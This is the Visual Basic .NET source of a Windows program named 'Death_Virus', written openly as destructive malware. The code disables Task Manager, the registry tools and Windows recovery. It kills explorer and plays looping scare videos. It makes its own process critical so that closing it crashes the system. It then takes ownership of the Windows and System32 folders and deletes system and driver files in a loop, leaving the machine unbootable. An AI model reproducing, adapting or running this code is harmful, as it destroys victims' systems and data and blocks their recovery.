Imports Microsoft.Win32
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Data
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Linq
Imports System.Reflection
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports System.Media
Imports System.Runtime.InteropServices

Namespace Death_Virus
	Partial Public Class Death_Virus
		Inherits Form

		Private back_snd, noise_snd As SoundPlayer

		<DllImport("ntdll.dll", SetLastError := True)> _
		Private Shared Function NtSetInformationProcess(ByVal hProcess As IntPtr, ByVal processInformationClass As Integer, ByRef processInformation As Integer, ByVal processInformationLength As Integer) As Integer
		End Function


		Private isCritical As Integer = 1 ' we want this to be a Critical Process
		Private BreakOnTermination As Integer = &H1D ' value for BreakOnTermination (flag)

		Public Shared Sub Extract(ByVal [nameSpace] As String, ByVal outDirectory As String, ByVal internalFilePath As String, ByVal resourceName As String)
			Dim assembly As System.Reflection.Assembly = System.Reflection.Assembly.GetCallingAssembly()

			Using s As Stream = assembly.GetManifestResourceStream([nameSpace] & "." & (If(internalFilePath = "", "", internalFilePath & ".")) & resourceName)
			Using r As New BinaryReader(s)
			Using fs As New FileStream(outDirectory & "\" & resourceName, FileMode.OpenOrCreate)
			Using w As New BinaryWriter(fs)
				w.Write(r.ReadBytes(CInt(s.Length)))
			End Using
			End Using
			End Using
			End Using
		End Sub


		Public Sub New()
			'Create path
			Directory.CreateDirectory("C:\Program Files\Temp")
			'Extract
			Extract("Death_Virus", Application.StartupPath, "Resources", "AxInterop.WMPLib.dll")
			Extract("Death_Virus", Application.StartupPath, "Resources", "Interop.WMPLib.dll")
			Extract("Death_Virus", "C:\Program Files\Temp", "Resources", "bg.wav")
			Extract("Death_Virus", "C:\Program Files\Temp", "Resources", "death.mp4")
			Extract("Death_Virus", "C:\Program Files\Temp", "Resources", "static.mp4")
			Extract("Death_Virus", "C:\Program Files\Temp", "Resources", "static_noise.wav")
			InitializeComponent()
		End Sub

		Private Sub Death_Virus_Load(ByVal sender As Object, ByVal e As EventArgs) Handles MyBase.Load
			BackColor = Color.Black
			Cursor.Hide()
			Start_virus()
			Player1.uiMode = "none"
			Player1.Ctlenabled = False
			Player1.enableContextMenu = False
			Player1.fullScreen = False
			Player1.TabStop = False
			Player1.stretchToFit = True
			Player1.Dock = DockStyle.Fill
		End Sub

		Public Sub Start_virus()
			'Disable taskmgr
			Dim taskmgr As RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
			taskmgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord)
			Dim regedit As RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
			regedit.SetValue("DisableRegistryTools",1, RegistryValueKind.DWord)
			Dim killrecovery As New ProcessStartInfo()
			killrecovery.FileName = "cmd.exe"
			killrecovery.WindowStyle = ProcessWindowStyle.Hidden
			killrecovery.Arguments = "/k reagentc.exe /disable && exit"
			Dim pr = Process.Start(killrecovery)
			pr.WaitForExit()
			'Check process taskmgr
			Dim pname() As Process = Process.GetProcessesByName("taskmgr")
			If pname.Length = 1 Then
				Dim block_task As New ProcessStartInfo()
				block_task.FileName = "cmd.exe"
				block_task.WindowStyle = ProcessWindowStyle.Hidden
				block_task.Arguments = "/k taskkill /f /im taskmgr.exe && exit"
				Process.Start(block_task)
			End If
			'Kill explorer
			Dim pname2() As Process = Process.GetProcessesByName("explorer")
			If pname2.Length = 1 Then
				Dim block_exp As New ProcessStartInfo()
				block_exp.FileName = "cmd.exe"
				block_exp.WindowStyle = ProcessWindowStyle.Hidden
				block_exp.Arguments = "/k taskkill /f /im explorer.exe && exit"
				Process.Start(block_exp)
			End If
			'Video thread
			Dim play_video As New Thread(AddressOf Video_func)
			play_video.Start()
		End Sub

		Public Sub Video_func()
			Thread.Sleep(1000)
			Dim last_video As New Thread(AddressOf Video_func2)
			If File.Exists("C:\Program Files\Temp\static_noise.wav") AndAlso File.Exists("C:\Program Files\Temp\static.mp4") Then
				Try
					noise_snd = New SoundPlayer("C:\Program Files\Temp\static_noise.wav")
					Player1.URL = "C:\Program Files\Temp\static.mp4"
					Player1.settings.setMode("loop", True)
					noise_snd.PlayLooping()
				Catch
				End Try
			End If
			last_video.Start()
		End Sub

		Public Sub Video_func2()
			Thread.Sleep(10000) '10 sec delay
			Dim destroy_sys As New Thread(AddressOf system_destroy)
			If File.Exists("C:\Program Files\Temp\bg.wav") AndAlso File.Exists("C:\Program Files\Temp\death.mp4") Then
				Try
					back_snd = New SoundPlayer("C:\Program Files\Temp\bg.wav")
					Player1.URL = "C:\Program Files\Temp\death.mp4"
					Player1.settings.setMode("loop", True)
					back_snd.PlayLooping()
				Catch
				End Try
			End If
			destroy_sys.Start()

		End Sub

		Public Sub system_destroy()
			Thread.Sleep(1000)
			'BSOD set
			Process.EnterDebugMode()
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, isCritical, Len(New Integer))
			'Take rights to sys files
			Dim quote As String = """"
			Dim recovery As String = "C:\Recovery"
			Dim kill_sys As New ProcessStartInfo()
			kill_sys.FileName = "cmd.exe"
			kill_sys.WindowStyle = ProcessWindowStyle.Hidden
			kill_sys.Arguments = "/k takeown /f C:\Windows && icacls C:\Windows /grant " & quote & "%username%:F" & quote & " && takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant " & quote & "%username%:F" & quote & " && takeown / f C:\Windows\System32\drivers && icacls C:\Windows\System32\drivers /grant " & quote & "%username%:F" & quote & " && exit"
			Process.Start(kill_sys)
			'Destroy recovery and sys files
			If Directory.Exists(recovery) Then
				Directory.Move(recovery, "C:\billkok")
			End If
			Do While File.Exists("C:\Windows\System32\drivers\disk.sys") OrElse File.Exists("C:\Windows\System32\winload.exe")
				Dim filePaths() As String = Directory.GetFiles("C:\Windows")
				For Each filePath As String In filePaths
					Try
						File.Delete(filePath)
					Catch
					End Try
				Next filePath
				Dim filePaths2() As String = Directory.GetFiles("C:\Windows\System32")
				For Each filePath2 As String In filePaths2
					Try
						File.Delete(filePath2)
					Catch
					End Try
				Next filePath2
				Dim filePaths3() As String = Directory.GetFiles("C:\Windows\System32\drivers")
				For Each filePath3 As String In filePaths3
					Try
						File.Delete(filePath3)
					Catch
					End Try
				Next filePath3
			Loop

		End Sub

		Private Sub Death_Virus_FormClosing(ByVal sender As Object, ByVal e As FormClosingEventArgs) Handles MyBase.FormClosing
			e.Cancel = True
		End Sub
	End Class
End Namespace
